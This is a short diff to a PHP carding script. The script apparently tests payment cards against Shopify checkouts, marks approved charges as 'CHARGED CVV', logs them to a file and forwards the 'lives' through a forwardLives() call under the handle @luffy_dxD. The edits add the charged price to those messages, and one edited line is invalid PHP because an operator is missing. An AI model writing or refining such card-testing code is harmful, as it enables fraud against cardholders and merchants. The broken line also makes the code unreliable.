@@ -2405,12 +2405,12 @@ $errorMessage = isset($shopifyErrors[$response_code])
 
 if (strpos($response, "thank_you") || (strpos($response, "/processing?completed=true&reload_receipt=false&skip_shop_pay=true"))) {
 
-    echo '#Approved ' . $ip . '「CHARGED CVV」 「Shopify Charge : @luffy_dxD';
+    echo '#Approved ' . $ip . '「CHARGED CVV $price 」 「Shopify Charge : @luffy_dxD';
     fwrite(fopen("fortu.txt", 'a'), $ip . "\r\n");
-    forwardLives("Shopify","CHARGED CVV");
+    forwardLives("Shopify","CHARGED CVV $price");
 } else if (strpos($response, "INSUFFICIENT_FUNDS") || (strpos($response, "INCORRECT_CVC"))) {
     echo '#Approved ' . $ip . '「' . $errorMessage . ' : ' . $response_code . ' : @luffy_dxD」';
-    forwardLives("Shopify",$response_code);
+    forwardLives("Shopify",$response_code $price);
 } else {
     if (strpos($response, "ActionRequiredReceiptTimeout")) {
         $response_code = "ActionRequiredReceiptTimeout";
